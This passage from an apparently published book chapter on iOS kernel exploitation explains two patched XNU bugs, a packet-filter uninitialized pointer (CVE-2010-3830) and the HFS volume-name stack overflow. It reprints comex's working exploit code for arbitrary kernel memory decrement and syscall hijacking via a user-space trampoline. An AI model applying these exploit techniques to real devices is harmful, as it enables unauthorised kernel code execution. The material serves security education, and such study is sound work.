next section shows that even very limited kernel memory manipulations can
still lead to arbitrary code execution.
Uninitialized Kernel Variables
This exploit causes an uninitialized pointer element within a kernel structure
to get fi lled from user space. The vulnerability is located within the IOCTL
handler of the packet fi lter device and was discovered and exploited by comex.
His exploit was then used within the limera1n jailbreaking tool for untethering
iOS 4.1. Apple fi xed this vulnerability, which is also known as CVE-2010-3830
within iOS 4.2.1. Therefore, you can exploit this vulnerability only on devices
running iOS 4.1 and below.
cc0099..iinndddd 227744 44//1166//22001122 55::4477::0099 PPMM
Chapter 9 n Kernel Debugging and Exploitation 275
To understand the vulnerability, you can take a look at the IOCTL handler
of the packet fi lter device, because it is part of the original XNU kernel source.
The source tree needs to be only old enough to still be vulnerable (for example,
xnu-1504.9.17). The vulnerable IOCTL handler is defi ned inside the fi le /bsd/
net/pf_ioctl.c as follows:
static int
pfioctl(dev_t dev, u_long cmd, caddr_t addr, int flags, struct proc *p)
{
/* ... */
switch (cmd) {
/* ... */
case DIOCADDRULE: {
struct pfioc_rule *pr = (struct pfioc_rule *)addr;
struct pf_ruleset *ruleset;
struct pf_rule *rule, *tail;
/* ... copying and initializing part of the structure */
bcopy(&pr->rule, rule, sizeof (struct pf_rule));
rule->cuid = kauth_cred_getuid(p->p_ucred);
rule->cpid = p->p_pid;
rule->anchor = NULL;
rule->kif = NULL;
TAILQ_INIT(&rule->rpool.list);
/* initialize refcounting */
rule->states = 0;
rule->src_nodes = 0;
rule->entries.tqe_prev = NULL;
/* ... copying and initializing part of the structure */
if (rule->overload_tblname[0]) {
if ((rule->overload_tbl = pfr_attach_table(ruleset,
rule->overload_tblname)) == NULL)
error = EINVAL;
else
rule->overload_tbl->pfrkt_flags |= PFR_TFLAG_ACTIVE;
}
The important part in this code is that the structure element overload_tbl is
not initialized if the overload_tblname is an empty string. This would be fi ne if
all other parts of the code would use the same check, but other parts only check
that overload_tbl is not a NULL pointer. To abuse this you have to trigger a call
of the pf_rm_rule() function that is used to remove a rule:
void
pf_rm_rule(struct pf_rulequeue *rulequeue, struct pf_rule *rule)
{
if (rulequeue != NULL) {
if (rule->states src.addr);
pf_tbladdr_remove(&rule->dst.addr);
if (rule->overload_tbl)
pfr_detach_table(rule->overload_tbl);
}
To trigger such a code path you can simply let the DIOCADDRULE IOCTL handler
fail. However, several other ways exist, and comex decided to use the PF_CHANGE_
REMOVE action of the DIOCCHANGERULE IOCTL call instead:
case DIOCCHANGERULE:
/* ... */
if (pcr->action == PF_CHANGE_REMOVE) {
pf_rm_rule(ruleset->rules[rs_num].active.ptr, oldrule);
ruleset->rules[rs_num].active.rcount--;
} else {
No matter which method is chosen, the code fi nally calls the pfr_detach_
table() function to decrease the reference counter of the table:
void
pfr_detach_table(struct pfr_ktable *kt)
{
lck_mtx_assert(pf_lock, LCK_MTX_ASSERT_OWNED);
if (kt->pfrkt_refcnt[PFR_REFCNT_RULE] pfrkt_refcnt[PFR_REFCNT_RULE]);
else if (!--kt->pfrkt_refcnt[PFR_REFCNT_RULE])
pfr_setflags_ktable(kt, kt->pfrkt_flags&~PFR_TFLAG_REFERENCED);
}
It is important to remember that the attacker controls the kt pointer that is
used within this function by setting the overload_tbl pointer accordingly.
This means a user space process can use this vulnerability to decrease an inte-
ger stored anywhere in kernel memory. The only limitation is that the value
cannot be smaller than or equal to zero. Before we discuss how you can use
this arbitrary memory decrease vulnerability to execute your own code, take a
look at comex’s exploit code. First, it opens the packet fi lter device and resets it
via IOCTL. It then calls the pwn() function repeatedly, which implements the
actual exploit and decreases the supplied address a defi ned number of times:
// Yes, reopening is necessary
pffd = open(“/dev/pf”, O_RDWR);
cc0099..iinndddd 227766 44//1166//22001122 55::4477::0099 PPMM
Chapter 9 n Kernel Debugging and Exploitation 277
ioctl(pffd, DIOCSTOP);
assert(!ioctl(pffd, DIOCSTART));
while(num_decs--)
pwn();
assert(!ioctl(pffd, DIOCSTOP));
close(pffd);
Within the pwn() function, the necessary structures are set up and the
vulnerable IOCTL handlers are called to fi rst add the malicious rule and imme-
diately remove it afterwards. This decreases the supplied memory address
by one.
static void pwn(unsigned int addr) {
struct pfioc_trans trans;
struct pfioc_trans_e trans_e;
struct pfioc_pooladdr pp;
struct pfioc_rule pr;
memset(&trans, 0, sizeof(trans));
memset(&trans_e, 0, sizeof(trans_e));
memset(&pr, 0, sizeof(pr));
trans.size = 1;
trans.esize = sizeof(trans_e);
trans.array = &trans_e;
trans_e.rs_num = PF_RULESET_FILTER;
memset(trans_e.anchor, 0, MAXPATHLEN);
assert(!ioctl(pffd, DIOCXBEGIN, &trans));
u_int32_t ticket = trans_e.ticket;
assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
u_int32_t pool_ticket = pp.ticket;
pr.action = PF_PASS;
pr.nr = 0;
pr.ticket = ticket;
pr.pool_ticket = pool_ticket;
memset(pr.anchor, 0, MAXPATHLEN);
memset(pr.anchor_call, 0, MAXPATHLEN);
pr.rule.return_icmp = 0;
pr.rule.action = PF_PASS;
pr.rule.af = AF_INET;
pr.rule.proto = IPPROTO_TCP;
pr.rule.rt = 0;
pr.rule.rpool.proxy_port[0] = htons(1);
pr.rule.rpool.proxy_port[1] = htons(1);
pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
cc0099..iinndddd 227777 44//1166//22001122 55::4477::0099 PPMM
278 Chapter 9 n Kernel Debugging and Exploitation
pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
pr.rule.overload_tbl = (void *)(addr - 0x4a4);
errno = 0;
assert(!ioctl(pffd, DIOCADDRULE, &pr));
assert(!ioctl(pffd, DIOCXCOMMIT, &trans));
pr.action = PF_CHANGE_REMOVE;
assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}
The most important part here is that the exploit subtracts the value 0x4a4
from the address you want to decrease. This has to be done, because it is the
offset of the reference counter within the table structure.
Now that you can decrement a value anywhere within kernel memory,
the question is, how can you turn this into an arbitrary code execution
exploit? And the answer is that quite a number of possibilities exist. Because
you can repeat the exploit an unlimited number of times, you can zero out
parts of the kernel code, which will be decoded as MOVS R0,R0 in thumb
code. This is more or less a NOP, and therefore you can use it to overwrite
security checks. That way you can introduce new vulnerabilities like stack
buffer overfl ows.
An easier attack is to decrement the highest byte of a kernel-level function
pointer. By repeatedly decrementing, it is possible to move the kernel-level
function pointer into the user space memory area. Comex uses this approach
in his exploit and decrements the system call handler 0 until it points into user
space memory. Afterwards he uses the mmap() system call to map memory at
this address. The mapped memory is then fi lled with trampoline code that
jumps into the code segment of the exploit:
unsigned int target_addr = CONFIG_TARGET_ADDR;
unsigned int target_addr_real = target_addr & ~1;
unsigned int target_pagebase = target_addr & ~0xfff;
unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
assert(MAP_FAILED != mmap((void *) target_pagebase, 0x2000, PROT_READ |
PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0));
unsigned short *p = (void *) target_addr_real;
if(target_addr_real & 2) *p++ = 0x46c0; // nop
*p++ = 0x4b00; // ldr r3, [pc]
*p++ = 0x4718; // bx r3
*((unsigned int *) p) = (unsigned int) &ok_go;
assert(!mprotect((void *)target_pagebase,
0x2000, PROT_READ | PROT_EXEC));
Once everything is in place, the arbitrary code execution is triggered by
executing syscall(0).
cc0099..iinndddd 227788 44//1166//22001122 55::4477::0099 PPMM
Chapter 9 n Kernel Debugging and Exploitation 279
Kernel Stack Buffer Overfl ows
Kernel-level stack buffer overfl ow vulnerabilities are usually caused by an
unrestricted copy operation into a stack-based buffer. Whenever this happens,
the saved return address on the kernel stack can be overwritten and replaced
with a pointer to your shellcode. As you saw in the previous examples, iOS
allows returning to code that was injected into writable kernel memory or
returning into code that already existed in the user space memory range. Unlike
in user space, there are no exploit mitigations within the kernel; therefore,
exploiting a kernel-level stack buffer overfl ow in iOS 4 is pretty straightfor-
ward. It nearly always comes down to overwriting the return address and
returning into code already prepared from user space. In iOS 5 it is a little
bit more diffi cult and usually requires the use of some kernel-level return
oriented programming.
The example for this vulnerability class was discovered by pod2g and is
known as the HFS legacy volume name stack buffer overfl ow. It is caused by
an unrestricted character-set copy and conversion function that is called while
mounting a legacy HFS fi lesystem. An exploit for this vulnerability was fi rst
distributed with the iOS 4.2.1 jailbreak. It consists of three parts. The fi rst part
is merely a piece of code that mounts a malicious, HFS fi lesystem from an
image fi le. The second part is the malicious image itself that triggers the buffer
overfl ow, and the third and last part is the actual payload code that is mapped
at the specifi c position to which the exploit returns.
Before you look into the actual exploit you fi rst have to look at the vulnerable
code. It is part of the XNU kernel code and therefore available as open source.
The vulnerable code is located within the fi le /bsd/hfs/hfs_encoding.c inside
the function mac_roman_to_unicode():
int
mac_roman_to_unicode(const Str31 hfs_str, UniChar *uni_str,
unused u_int32_t maxCharLen, u_int32_t
*unicodeChars)
{
const u_int8_t *p;
UniChar *u;
u_int16_t pascalChars;
u_int8_t c;
p = hfs_str;
u = uni_str;
*unicodeChars = pascalChars = *(p++); /* pick up length byte */
while (pascalChars--) {
c = *(p++);
if ( (int8_t) c >= 0 ) { /* check if seven bit ascii */
cc0099..iinndddd 227799 44//1166//22001122 55::4477::0099 PPMM
280 Chapter 9 n Kernel Debugging and Exploitation
*(u++) = (UniChar) c; /* just pad high byte with zero */
} else { /* its a hi bit character */
/* ... */
}
}
return noErr;
}
A few things are very interesting about this function. First of all, the function
is called with a parameter specifying the maximum number of bytes in the out-
put buffer (maxCharLen). You can also see that this parameter is not used at all
inside the function. Instead, the string is expected to be in Pascal format, which
means the fi rst byte defi nes the length. This length fi eld is fully trusted by the
copy and conversion loop. There is no check that protects against overwriting
the end of the buffer. The next important thing here is that the output character
width is 16 bit, which means that every second byte will be zero. The only excep-
tions are characters with ASCII values above 127. Those are converted by some
lookup table that severely limits the possible outputs. The code was omitted,
because it is not usable for the exploit. Because every second byte is fi lled with
zero, you can return into only the fi rst 24 megabytes of user space memory, and
therefore don’t really have a chance to use one of the other exploitation methods.
When mounting an HFS image, the call to mac_roman_to_unicode() comes
from within the function hfs_to_utf8(), which is also defi ned within the fi le
/bsd/hfs/hfs_encoding.c. The call is via a function pointer.
int
hfs_to_utf8(ExtendedVCB *vcb, const Str31 hfs_str, ByteCount maxDstLen,
ByteCount *actualDstLen, unsigned char* dstStr)
{
int error;
UniChar uniStr[MAX_HFS_UNICODE_CHARS];
ItemCount uniCount;
size_t utf8len;
hfs_to_unicode_func_t hfs_
get_unicode = VCBTOHFS(vcb)->hfs_get_unicode;
error = hfs_get_unicode(hfs_str, uniStr,
MAX_HFS_UNICODE_CHARS, &uniCount);
if (uniCount == 0)
error = EINVAL;
if (error == 0) {
error = utf8_encodestr(uniStr, uniCount * sizeof(UniChar),
dstStr, &utf8len, maxDstLen , ‘:’, 0);
if (error == ENAMETOOLONG)
*actualDstLen = utf8_encodelen(uniStr, uniCount *
cc0099..iinndddd 228800 44//1166//22001122 55::4477::0099 PPMM
Chapter 9 n Kernel Debugging and Exploitation 281
sizeof(UniChar),
‘:’, 0);
else
*actualDstLen = utf8len;
}
return error;
}
Now have a look at the defi nition of the legacy HFS master directory header
included as part of the XNU source code in the fi le /bsd/hfs/hfs_format.h.
The master directory block is stored within the third sector of the fi lesystem
and a copy is also stored in the second to last sector:
/* HFS Master Directory Block - 162 bytes */
/* Stored at sector #2 (3rd sector) and second-to-last sector. */
struct HFSMasterDirectoryBlock {